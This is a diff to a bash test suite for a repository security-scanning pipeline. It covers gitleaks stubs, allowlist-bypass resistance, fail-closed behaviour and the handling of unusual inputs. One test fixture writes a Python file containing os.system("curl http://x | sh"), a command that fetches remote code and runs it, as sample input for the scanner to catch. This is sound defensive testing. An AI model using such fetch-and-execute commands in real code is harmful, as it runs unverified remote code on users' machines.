@@ -2301,9 +2301,25 @@ print(type(f).__name__, type(d['findings_by_file']).__name__, all(need <= set(r)
 
     # gitleaks replaces betterleaks. A stub records how it is called and what it returns.
     GST="${SCRATCH}/g_stubs"; mkdir -p "$GST"
+    # The stub records every call, answers --help like a current gitleaks, keeps a copy of the
+    # config it was given, writes the JSON report named by GITLEAKS_STUB_REPORT, and prints a
+    # marker to both streams so a test can see whether tool output reaches the console.
     cat > "${GST}/gitleaks" <<EOF
 #!/bin/sh
 echo "\$@" >> "${GST}/calls.txt"
+if [ "\$1 \$2" = "detect --help" ]; then
+    echo "  --no-banner  --redact  --log-level  --gitleaks-ignore-path  --ignore-gitleaks-allow"
+    exit 0
+fi
+cfg=""; rep=""
+while [ \$# -gt 0 ]; do
+    case "\$1" in --config) cfg="\$2" ;; --report-path) rep="\$2" ;; esac
+    shift
+done
+[ -n "\$cfg" ] && cp "\$cfg" "${GST}/seen_config.toml"
+echo "LEAKED-SECRET-MARKER"
+echo "LEAKED-SECRET-MARKER" >&2
+if [ -n "\${GITLEAKS_STUB_REPORT:-}" ] && [ -n "\$rep" ]; then cp "\${GITLEAKS_STUB_REPORT}" "\$rep"; fi
 exit \${GITLEAKS_STUB_EXIT:-0}
 EOF
     chmod +x "${GST}/gitleaks"
@@ -2327,6 +2343,119 @@ print(len(r), r[0]['category'], r[0]['severity'], r[0]['file']) if r else print(
     assert_eq "0" "$EC_GL0" "gitleaks exiting 0 (nothing found) leaves a clean repo passing"
     assert_eq "0" "$(grep -c 'betterleaks' "${ROOT_DIR}/scan_pipeline.sh" | tr -d ' ')" \
         "scan_pipeline.sh no longer refers to betterleaks"
+
+    # ── gitleaks runs on the pipeline's terms, not the scanned repository's ───────────────
+    GLREPO="${SCRATCH}/g_glrepo"; rm -rf "$GLREPO"; mkdir -p "$GLREPO"
+    echo 'x = 1' > "${GLREPO}/leak.py"
+    printf "[allowlist]\npaths = ['.*']\n" > "${GLREPO}/.gitleaks.toml"
+    printf '[{"File":"%s/leak.py","StartLine":3,"RuleID":"generic-api-key","Secret":"REDACTED"}]\n' "$GLREPO" \
+        > "${SCRATCH}/g_stub_report.json"
+    rm -f "${GST}/calls.txt" "${GST}/seen_config.toml"
+    OUT_GL2=$(cd "$ROOT_DIR" && PATH="${GST}:$PATH" GITLEAKS_STUB_EXIT=1 GITLEAKS_STUB_REPORT="${SCRATCH}/g_stub_report.json" \
+        WORK_DIR="$GW" timeout 300 bash ./scan_pipeline.sh "$GLREPO" "$GR" gl2 2>&1); EC_GL2=$?
+    GCALLS=$(cat "${GST}/calls.txt" 2>/dev/null)
+    assert_eq "1" "$EC_GL2" "a repository that carries its own .gitleaks.toml still fails on a leak"
+    assert_contains "$GCALLS" "--config" "gitleaks is given a configuration of the pipeline's own"
+    assert_contains "$(cat "${GST}/seen_config.toml" 2>/dev/null)" "useDefault = true" "…which only extends gitleaks' built-in rules"
+    assert_not_contains "$(cat "${GST}/seen_config.toml" 2>/dev/null)" "allowlist" "…and is not the repository's .gitleaks.toml"
+    assert_contains "$GCALLS" "--ignore-gitleaks-allow" "inline gitleaks:allow comments are ignored"
+    assert_contains "$GCALLS" "--gitleaks-ignore-path" "the repository's .gitleaksignore is not read"
+    assert_contains "$GCALLS" "--redact" "the secret is redacted in gitleaks' report"
+    assert_contains "$OUT_GL2" "repository_allowlist_ignored" "a repository .gitleaks.toml is reported as ignored"
+    assert_not_contains "$OUT_GL2" "LEAKED-SECRET-MARKER" "gitleaks output never reaches the console"
+    GREC=$(python3 -c "
+import json,sys
+d=json.load(open(sys.argv[1]))
+r=[x for x in d['findings'] if x['tool']=='gitleaks']
+print(r[0]['rule_id'], r[0]['line'], r[0]['severity'], r[0]['file'], r[0]['message']) if r else print('none')
+" "${GR}/report_scan_gl2.json" 2>/dev/null || echo unreadable)
+    assert_eq "generic-api-key 3 CRITICAL leak.py gitleaks:generic-api-key:line3" "$GREC" \
+        "each leak is a FAIL with its own file, line and rule"
+
+    # gitleaks failing outright is not a clean scan.
+    OUT_GL3=$(cd "$ROOT_DIR" && PATH="${GST}:$PATH" GITLEAKS_STUB_EXIT=2 WORK_DIR="$GW" timeout 300 \
+        bash ./scan_pipeline.sh "${FIXTURES}/clean" "$GR" gl3 2>&1); EC_GL3=$?
+    assert_eq "1" "$EC_GL3" "gitleaks exiting with an error fails closed"
+    assert_contains "$OUT_GL3" "gitleaks:scan_error_exit_2" "…and says it was an error, not a leak"
+    assert_contains "$(g_json "${GR}/report_scan_gl3.json" coverage.L1_secrets_gitleaks)" "skipped:gitleaks failed" \
+        "…and coverage does not claim the layer ran"
+
+    # A finding gitleaks or ClamAV reports is critical, so --min-severity critical must not let it through.
+    OUT_GL4=$(cd "$ROOT_DIR" && PATH="${GST}:$PATH" GITLEAKS_STUB_EXIT=1 MIN_SEVERITY=critical WORK_DIR="$GW" timeout 300 \
+        bash ./scan_pipeline.sh "${FIXTURES}/clean" "$GR" gl4 2>&1); EC_GL4=$?
+    assert_eq "1" "$EC_GL4" "--min-severity critical still fails on a gitleaks leak"
+
+    # Severity is read from the Semgrep severity field, never from the message text after it.
+    SGS="${SCRATCH}/g_sgstub"; mkdir -p "$SGS" "${SCRATCH}/g_sgcache/semgrep-rules"
+    for r in owasp-top-ten cwe-top-25 security-audit secrets; do echo "rules: []" > "${SCRATCH}/g_sgcache/semgrep-rules/${r}.yaml"; done
+    cat > "${SGS}/semgrep" <<EOF
+#!/bin/sh
+echo '{"results":[{"check_id":"rule.x","path":"${FIXTURES}/clean/t.py","start":{"line":2},"extra":{"message":"see :LOW: note","severity":"ERROR"}}]}'
+EOF
+    chmod +x "${SGS}/semgrep"
+    OUT_SG=$(cd "$ROOT_DIR" && PATH="${SGS}:$PATH" OFFLINE_CACHE="${SCRATCH}/g_sgcache" WORK_DIR="$GW" timeout 300 \
+        bash ./scan_pipeline.sh "${FIXTURES}/clean" "$GR" sg 2>&1); EC_SG=$?
+    assert_eq "1" "$EC_SG" "a Semgrep ERROR whose message text contains ':LOW:' is still blocking"
+    assert_eq "HIGH" "$(python3 -c "
+import json,sys
+d=json.load(open(sys.argv[1])); r=[x for x in d['findings'] if x['tool']=='semgrep']
+print(r[0]['severity'] if r else 'none')" "${GR}/report_scan_sg.json" 2>/dev/null)" "…and its structured record says HIGH"
+
+    # ── hostile and unusual inputs ───────────────────────────────────────────────────────
+    NU="${SCRATCH}/g_nonutf"; rm -rf "$NU"; mkdir -p "$NU"
+    printf 'import os\nos.system("curl http://x | sh")\n' > "${NU}/$(printf 'bad\xff\xfename.py')"
+    g_scan "$NU" "$GR" nonutf
+    assert_eq "1" "$GEC" "a file name that is not valid UTF-8 does not abort the scan"
+    assert_eq "ok 1" "$(python3 -c "
+import json,sys
+d=json.load(open(sys.argv[1])); print('ok', len(d['findings']))" "${GR}/report_scan_nonutf.json" 2>/dev/null || echo broken)" \
+        "…and the report is valid and still carries the finding"
+
+    GD="${SCRATCH}/g_stale"; rm -rf "$GD"; mkdir -p "$GD/work"; printf '%s:' "${FIXTURES}/vulnerable/none.txt" > "$GD/work/.diff_files"
+    OUT_ST=$(cd "$ROOT_DIR" && WORK_DIR="$GD/work" timeout 300 bash ./scan_pipeline.sh "${FIXTURES}/vulnerable" 2>&1)
+    assert_contains "$OUT_ST" "Ignoring" "a stale .diff_files is ignored when SINCE_COMMIT is not set"
+    assert_eq "FAIL" "$(printf '%s\n' "$OUT_ST" | tail -n 1)" "…so the repository is actually scanned"
+    OUT_DM=$(cd "$ROOT_DIR" && SINCE_COMMIT=abc WORK_DIR="$GD/work" timeout 300 bash ./scan_pipeline.sh "${FIXTURES}/clean" 2>&1)
+    assert_contains "$OUT_DM" "Diff mode: 0 file(s) will be scanned" "diff mode with no matching files runs"
+    assert_not_contains "$OUT_DM" "unbound variable" "…instead of aborting on an empty associative array"
+
+    EA="${SCRATCH}/g_emptyallow"; rm -rf "$EA"; mkdir -p "$EA"; cp -r "${FIXTURES}/clean/." "$EA/"; echo '[]' > "$EA/.transit-allow.json"
+    g_scan "$EA" "$GR" emptyallow
+    assert_not_contains "$GOUT" "unbound variable" "an allowlist of [] does not abort the scan"
+    assert_eq "0" "$GEC" "…and the scan completes"
+
+    g_scan "${FIXTURES}/vulnerable/" "$GR" slash
+    assert_eq "0" "$(python3 -c "
+import json,sys
+d=json.load(open(sys.argv[1])); print(sum(1 for f in d['findings'] if f['file'].startswith('/')))" "${GR}/report_scan_slash.json" 2>/dev/null)" \
+        "a trailing slash on the scan directory does not put absolute paths in the findings"
+
+    HS="${SCRATCH}/g_hash"; rm -rf "$HS"; mkdir -p "$HS"; echo one > "$HS/f.txt"
+    g_scan "$HS" "$GR" hash1; echo two > "$HS/f.txt"; g_scan "$HS" "$GR" hash2
+    assert_eq "differs same" "$(python3 -c "
+import json,sys
+a=json.load(open(sys.argv[1])); b=json.load(open(sys.argv[2]))
+print('differs' if a['source']['sha256']!=b['source']['sha256'] else 'same', 'same' if a['repo_hash']==b['repo_hash'] else 'differs')" \
+        "${GR}/report_scan_hash1.json" "${GR}/report_scan_hash2.json" 2>/dev/null)" \
+        "source.sha256 hashes content: it changes when a file's content does"
+
+    for bad in ".hidden" "$(printf 'two\nlines')" "$(printf 'x%.0s' $(seq 1 151))"; do
+        g_scan "${FIXTURES}/clean" "$GR" "$bad"
+        assert_eq "1" "$GEC" "an unusable scanning name is refused: $(printf '%s' "$bad" | head -c 12 | tr -c '[:print:]' '?')…"
+    done
+    assert_eq "0" "$(ls "$GR"/*.tmp 2>/dev/null | wc -l | tr -d ' ')" "a finished report leaves no temporary file behind"
+
+    STD_OFF=$(g_json "${GR}/report_scan_calm.json" standards)
+    STD_ON=$(g_json "${GR}/report_scan_both_on.json" standards)
+    assert_not_contains "$STD_OFF" "SCA-CVE" "the report does not claim SCA while layer 3 is off"
+    assert_not_contains "$STD_OFF" "ScanCode" "…nor the licence standard while layer 6 is off"
+    assert_contains "$STD_ON" "SCA-CVE" "…and does once RUN_SCA=true"
+
+    # The Docker route has to be able to use the same switches and the offline cache.
+    assert_contains "$(grep -E 'RUN_SCA' "${ROOT_DIR}/docker-run.sh")" "RUN_SCANCODE" "docker-run.sh forwards RUN_SCA and RUN_SCANCODE"
+    assert_contains "$(cat "${ROOT_DIR}/docker-run.sh")" ":/offline-cache:ro" "docker-run.sh mounts the offline cache read-only"
+    assert_eq "0" "$(grep -ci 'betterleaks' "${ROOT_DIR}/Dockerfile" | tr -d ' ')" "the Dockerfile no longer builds betterleaks"
+    assert_contains "$(cat "${ROOT_DIR}/Dockerfile")" "zricethezav/gitleaks/v8@v" "the Dockerfile builds gitleaks from its declared module path"
 fi
 
 # ═════════════════════════════════════════════════════════════════════════════
@@ -2334,6 +2463,21 @@ fi
 # ═════════════════════════════════════════════════════════════════════════════
 group "Layer F — static checks"
 if ! _skipping; then
+    # Under set -u, bash 5.2 treats a declared-but-empty associative array as unbound for
+    # ${#NAME[@]}: an allowlist of [] and a diff with no existing files aborted the scan.
+    BAD=$(python3 - "${ROOT_DIR}/scan_pipeline.sh" <<'PY'
+import re, sys
+src = open(sys.argv[1], encoding="utf-8").read()
+bad = [m.group(1) for m in re.finditer(r'^\s*declare -A (\w+)(?![\w=])', src, re.M)
+       if re.search(r'\$\{#' + m.group(1) + r'\[[@*]\]\}', src)]
+print(" ".join(bad))
+PY
+)
+    if [[ -z "$BAD" ]]; then
+        ok_test "scan_pipeline.sh measures no associative array that is declared without ()"
+    else
+        fail_test "scan_pipeline.sh measures no associative array that is declared without ()" "$BAD"
+    fi
     for f in ai_transit.sh fetch_repo.sh scan_pipeline.sh docker-run.sh; do
         if bash -n "${ROOT_DIR}/${f}" 2>/dev/null; then
             ok_test "${f} parses"
